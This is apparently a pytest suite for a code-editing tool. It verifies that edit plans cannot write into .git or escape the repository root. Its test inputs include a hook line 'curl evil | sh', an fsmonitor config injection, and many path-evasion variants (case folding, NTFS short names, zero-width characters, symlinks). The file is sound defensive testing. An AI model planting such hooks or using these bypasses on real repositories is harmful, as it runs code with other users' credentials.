"""A plan never writes into ``.git`` (issue #1565, found in the review of #1561).

A hook or a ``core.*`` line planted in ``.git`` runs outside every sandbox with the credentials of whoever runs git next.
``_safe_path`` already refused absolute paths, ``..`` and symlinks that leave the root, but ``.git`` is inside the root, so
``.git/hooks/pre-commit``, ``.git/config`` and a symlink to ``.git`` were all applied. Every plan operation that names a
path (``path`` and ``dest``) now goes through the same refusal, on any filesystem git supports (case folding, NTFS
trailing dots and ``git~1``, HFS+ zero-width code points, backslash separators), and also after symlinks are resolved.
"""

from __future__ import annotations

import hashlib
import json
import subprocess
from pathlib import Path

import pytest

from simplicio.mechanical_edit import execute_plan

HOOK = "#!/bin/sh\necho ok\n"
CONFIG = "[core]\n\trepositoryformatversion = 0\n"


@pytest.fixture(autouse=True)
def _local_edit(monkeypatch):
    monkeypatch.setenv("SIMPLICIO_DEV_CLI_NO_RUNTIME_EDIT", "1")
    monkeypatch.setenv("SIMPLICIO_SKIP_AUTO_INIT", "1")


@pytest.fixture
def repo(tmp_path):
    root = tmp_path / "repo"
    (root / ".git" / "hooks").mkdir(parents=True)
    (root / ".git" / "config").write_text(CONFIG, encoding="utf-8")
    (root / ".git" / "hooks" / "pre-commit").write_text(HOOK, encoding="utf-8")
    (root / "sub").mkdir()
    (root / "app.py").write_text("old\n", encoding="utf-8")
    (root / "outside_link_target").mkdir()
    return root


def _tree(root: Path) -> dict[str, str]:
    return {
        str(path.relative_to(root)): hashlib.sha256(path.read_bytes()).hexdigest()
        for path in sorted(root.rglob("*"))
        if path.is_file() and not path.is_symlink()
    }


def _create(path: str) -> dict:
    return {"op": "create_file", "path": path, "text": "planted\n"}


def _plan(*operations: dict) -> dict:
    touched = []
    for operation in operations:
        for key in ("path", "dest"):
            if key in operation and operation[key] not in touched:
                touched.append(operation[key])
    return {"schema": "simplicio.mechanical-edit/v1", "touched_files": touched, "operations": list(operations)}


def _refused(repo: Path, *operations: dict, apply: bool = True) -> dict:
    before = _tree(repo)
    result = execute_plan(_plan(*operations), root=repo, apply=apply)
    assert result["status"] == "refused", result
    assert result["applied"] is False
    assert {error["code"] for error in result["errors"]} == {"unsafe_path"}, result["errors"]
    assert _tree(repo) == before  # nothing was written, replaced or removed
    return result


GIT_PATHS = [
    pytest.param(".git/hooks/pre-commit", id="hook"),
    pytest.param(".git/hooks/post-checkout", id="new-hook"),
    pytest.param(".git/config", id="config"),
    pytest.param(".git/info/exclude", id="info"),
    pytest.param(".git/HEAD", id="head"),
    pytest.param(".git", id="the-dir-itself"),
    pytest.param("./.git/config", id="dot-slash"),
    pytest.param("sub/.git/config", id="nested-repo"),
    pytest.param("sub/.git/hooks/pre-commit", id="nested-repo-hook"),
    pytest.param("sub/../.git/config", id="dot-dot-into-git"),
    pytest.param(".GIT/hooks/pre-push", id="upper"),
    pytest.param(".Git/config", id="mixed-case"),
    pytest.param(".gIT", id="mixed-case-itself"),
    pytest.param(".git\\hooks\\pre-commit", id="backslashes"),
    pytest.param("sub\\.git\\config", id="backslashes-nested"),
    pytest.param(".GIT\\config", id="backslashes-upper"),
    pytest.param(".git./config", id="ntfs-trailing-dot"),
    pytest.param(".git /config", id="ntfs-trailing-space"),
    pytest.param(".git.../config", id="ntfs-trailing-dots"),
    pytest.param("GIT~1/config", id="ntfs-short-name"),
    pytest.param("git~1/hooks/pre-commit", id="ntfs-short-name-lower"),
    pytest.param(".g\u200cit/config", id="hfs-zero-width-non-joiner"),
    pytest.param(".gi\u200bt/config", id="hfs-zero-width-space"),
    pytest.param("\ufeff.git/config", id="hfs-bom"),
]


@pytest.mark.parametrize("path", GIT_PATHS)
def test_a_new_file_inside_git_is_refused(repo, path):
    _refused(repo, _create(path))


@pytest.mark.parametrize("path", GIT_PATHS)
def test_the_refusal_also_holds_in_a_dry_run(repo, path):
    _refused(repo, _create(path), apply=False)


@pytest.mark.parametrize(
    "operation",
    [
        pytest.param({"op": "replace_range", "path": ".git/hooks/pre-commit", "start_line": 2, "end_line": 2, "text": "curl evil | sh\n"},
                     id="replace-a-line-of-an-existing-hook"),
        pytest.param({"op": "insert_after", "path": ".git/config", "line": 1, "text": "[core]\n\tfsmonitor = evil\n"},
                     id="insert-into-config"),
        pytest.param({"op": "delete_range", "path": ".git/config", "start_line": 1, "end_line": 1}, id="delete-from-config"),
        pytest.param({"op": "delete_file", "path": ".git/hooks/pre-commit"}, id="delete-a-hook"),
        pytest.param({"op": "move_file", "path": "app.py", "dest": ".git/hooks/pre-commit2"}, id="move-into-git"),
        pytest.param({"op": "move_file", "path": ".git/config", "dest": "stolen-config"}, id="move-out-of-git"),
        pytest.param({"op": "move_file", "path": "app.py", "dest": ".GIT/config2"}, id="move-into-upper-git"),
    ],
)
def test_every_operation_kind_is_refused_when_a_path_or_dest_is_inside_git(repo, operation):
    _refused(repo, operation)


@pytest.mark.parametrize(
    "path",
    [
        pytest.param("/etc/cron.d/planted", id="absolute"),
        pytest.param("/tmp/planted-outside", id="absolute-tmp"),
        pytest.param("C:\\Users\\x\\planted", id="windows-drive"),
        pytest.param("C:/Users/x/planted", id="windows-drive-slash"),
        pytest.param("\\\\server\\share\\planted", id="unc"),
        pytest.param("..", id="parent"),
        pytest.param("../planted", id="parent-file"),
        pytest.param("sub/../../planted", id="escape-by-dot-dot"),
        pytest.param("..\\planted", id="escape-by-backslash"),
        pytest.param("sub/..\\..\\planted", id="escape-by-mixed"),
        pytest.param("a\0b", id="nul"),
        pytest.param("", id="empty"),
    ],
)
def test_paths_that_leave_the_repository_stay_refused(repo, path):
    before = _tree(repo)
    result = execute_plan(_plan(_create(path)), root=repo, apply=True)
    assert result["status"] == "refused" and result["applied"] is False
    assert _tree(repo) == before


def test_a_symlink_to_git_is_refused_for_a_new_file(repo):
    (repo / "hooks-link").symlink_to(".git/hooks")
    _refused(repo, _create("hooks-link/post-commit"))


def test_a_symlink_to_the_git_dir_is_refused(repo):
    (repo / "gitlink").symlink_to(".git")
    _refused(repo, _create("gitlink/hooks/post-commit"))
    _refused(repo, {"op": "insert_after", "path": "gitlink/config", "line": 1, "text": "[core]\n\tfsmonitor = evil\n"})


def test_a_symlink_to_a_file_inside_git_is_refused(repo):
    (repo / "hook-link").symlink_to(".git/hooks/pre-commit")
    _refused(repo, {"op": "replace_range", "path": "hook-link", "start_line": 2, "end_line": 2, "text": "evil\n"})


def test_a_chain_of_symlinks_that_ends_in_git_is_refused(repo):
    (repo / "first").symlink_to("second")
    (repo / "second").symlink_to(".git")
    _refused(repo, _create("first/hooks/post-commit"))


def test_a_symlink_in_a_subdirectory_to_git_is_refused(repo):
    (repo / "sub" / "up").symlink_to("../.git")
    _refused(repo, _create("sub/up/hooks/post-commit"))


def test_a_symlink_that_leaves_the_repository_stays_refused(repo, tmp_path):
    (repo / "escape").symlink_to(tmp_path)
    before = _tree(repo)
    result = execute_plan(_plan(_create("escape/planted")), root=repo, apply=True)
    assert result["status"] == "refused" and not (tmp_path / "planted").exists()
    assert _tree(repo) == before


@pytest.mark.parametrize(
    "path",
    [
        ".gitignore",
        ".gitattributes",
        ".github/workflows/ci.yml",
        ".gitmodules",
        "docs/git-notes.md",
        "src/gitlib.py",
        "sub/.gitkeep",
        "my.git/x",
        "git/x",
        "gitt~1/x",
        "a/.git-hooks/pre-commit",
        ".githooks/pre-commit",
        "outside_link_target/file.txt",
    ],
)
def test_ordinary_paths_next_to_the_name_git_are_still_written(repo, path):
    result = execute_plan(_plan(_create(path)), root=repo, apply=True)
    assert result["status"] == "ok" and result["applied"] is True, result
    assert (repo / path).read_text(encoding="utf-8") == "planted\n"


def test_a_symlink_to_an_ordinary_directory_inside_the_repository_still_works(repo):
    (repo / "alias").symlink_to("outside_link_target")
    result = execute_plan(_plan(_create("alias/new.txt")), root=repo, apply=True)
    assert result["status"] == "ok" and (repo / "outside_link_target" / "new.txt").exists()


def test_a_mixed_plan_is_refused_whole_and_writes_nothing(repo):
    before = _tree(repo)
    result = execute_plan(_plan(_create("fine.txt"), _create(".git/hooks/post-commit")), root=repo, apply=True)
    assert result["status"] == "refused" and result["applied"] is False
    assert _tree(repo) == before and not (repo / "fine.txt").exists()


def test_the_error_names_the_path_and_the_reason(repo):
    result = _refused(repo, _create(".git/hooks/post-commit"))
    error = result["errors"][0]
    assert error["path"] == ".git/hooks/post-commit" and ".git" in error["message"]


def test_the_cli_compile_step_refuses_a_hook_before_it_pins_the_plan(tmp_path, capsys):
    """The loop runs ``edit --compile`` then ``edit --apply``: the first step already refuses, so no plan is pinned."""
    from simplicio import cli

    git_repo = tmp_path / "gitrepo"
    git_repo.mkdir()
    (git_repo / "app.py").write_text("old\n", encoding="utf-8")
    for args in (["init", "-q"], ["add", "app.py"], ["-c", "user.email=a@example.com", "-c", "user.name=t", "commit", "-qm", "i"]):
        subprocess.run(["git", "-C", str(git_repo), *args], check=True, capture_output=True)
    (git_repo / "hooks-link").symlink_to(".git/hooks")
    ops = tmp_path / "ops.json"
    compiled = tmp_path / "compiled.json"
    before = _tree(git_repo)
    for path in (".git/hooks/post-commit", "hooks-link/post-commit", ".GIT/config", ".git\\config"):
        ops.write_text(json.dumps({"operations": [{"path": path, "find": "", "replace": "planted\n"}]}), encoding="utf-8")
        code = cli.main(["edit", "--root", str(git_repo), "--plan", str(ops), "--compile", str(compiled), "--json", "--no-runtime"])
        out = capsys.readouterr().out
        assert code != 0 and "unsafe_path" in out, (path, out)
        assert not compiled.exists(), path
        assert _tree(git_repo) == before


def test_the_mechanical_edit_command_refuses_a_plan_that_names_a_hook(tmp_path, capsys):
    """A plan file written by hand (not by ``edit --compile``) must be refused too: the guard is in the apply step."""
    from simplicio import cli

    git_repo = tmp_path / "gitrepo"
    git_repo.mkdir()
    (git_repo / "app.py").write_text("old\n", encoding="utf-8")
    plan = tmp_path / "plan.json"
    plan.write_text(json.dumps(_plan(_create(".git/hooks/post-commit"))), encoding="utf-8")
    code = cli.main(["mechanical-edit", "--root", str(git_repo), "--plan", str(plan), "--apply", "--json"])
    out = capsys.readouterr().out
    assert code != 0 and "unsafe_path" in out
    assert not (git_repo / ".git" / "hooks" / "post-commit").exists()


def test_the_compile_step_refuses_an_unsafe_path_before_it_reads_the_file(tmp_path, capsys):
    """``find`` against ``/etc/hostname`` used to be read and answered with a match count: an oracle on any file."""
    from simplicio import cli

    git_repo = tmp_path / "gitrepo"
    git_repo.mkdir()
    ops = tmp_path / "ops.json"
    compiled = tmp_path / "compiled.json"
    outside = tmp_path / "outside.txt"
    outside.write_text("secret\n", encoding="utf-8")
    for path in (str(outside), "../outside.txt", "sub/../../outside.txt"):
        ops.write_text(json.dumps({"operations": [{"path": path, "find": "secret", "replace": "x"}]}), encoding="utf-8")
        code = cli.main(["edit", "--root", str(git_repo), "--plan", str(ops), "--compile", str(compiled), "--json", "--no-runtime"])
        out = capsys.readouterr().out
        assert code != 0 and "unsafe_path" in out and "matched" not in out, (path, out)
        assert not compiled.exists()
    assert outside.read_text(encoding="utf-8") == "secret\n"


def test_a_changeset_transaction_refuses_a_hook_and_leaves_no_staging_directory(repo):
    from simplicio.changeset_transaction import execute_changeset_transaction

    before = _tree(repo)
    result = execute_changeset_transaction(
        _plan(_create(".git/hooks/post-commit")), root=repo, idempotency_key="k-git", changeset_digest_value="d-git"
    )
    assert result["status"] == "refused" and {e["code"] for e in result["errors"]} == {"unsafe_path"}
    assert not (repo / ".git" / "hooks" / "post-commit").exists()
    assert {k: v for k, v in _tree(repo).items() if not k.startswith(".simplicio-loop")} == before
    assert not [p for p in repo.parent.iterdir() if p.name.startswith(".simplicio-tx-")]
